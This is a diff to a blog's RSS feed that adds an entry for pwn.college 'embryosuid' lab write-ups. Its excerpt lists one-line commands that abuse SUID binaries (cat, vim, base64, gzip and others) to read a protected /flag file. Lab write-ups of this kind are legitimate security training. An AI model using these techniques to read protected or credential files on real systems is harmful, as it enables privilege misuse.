@@ -6,7 +6,18 @@
     <description>Recent content in Labs on s0uthwood&#39;s Blog</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Tue, 04 Apr 2023 00:20:12 +0800</lastBuildDate><atom:link href="/categories/labs/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 04 Apr 2023 00:26:43 +0800</lastBuildDate><atom:link href="/categories/labs/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>pwn.college embryosuid writeups</title>
+      <link>/post/pwn-college-babysuid/</link>
+      <pubDate>Tue, 04 Apr 2023 00:26:43 +0800</pubDate>
+      
+      <guid>/post/pwn-college-babysuid/</guid>
+      <description>level 1 - level 49
+Ref: GTFOBins
+level1 cat $ cat /flag level2 more $ more /flag level3 less $ less /flag level4 tail $ tail /flag level5 head $ head /flag level6 sort $ sort /flag level7 vim $ vim /flag level8 emacs $ emacs /flag level9 nano $ nano /flag level10 rev $ rev /flag | rev level11 od $ od -c /flag level12 hd $ hd /flag level13 xxd $ xxd /flag level14 base32 $ base32 /flag | base32 -d level15 base64 $ base64 /flag | base64 -d level16 split $ split /flag $ cat xaa level17 gzip $ gzip -k /flag $ gzip -cd /flag.</description>
+    </item>
+    
     <item>
       <title>pwn.college embryoasm writeups</title>
       <link>/post/pwn-college-embryoasm/</link>
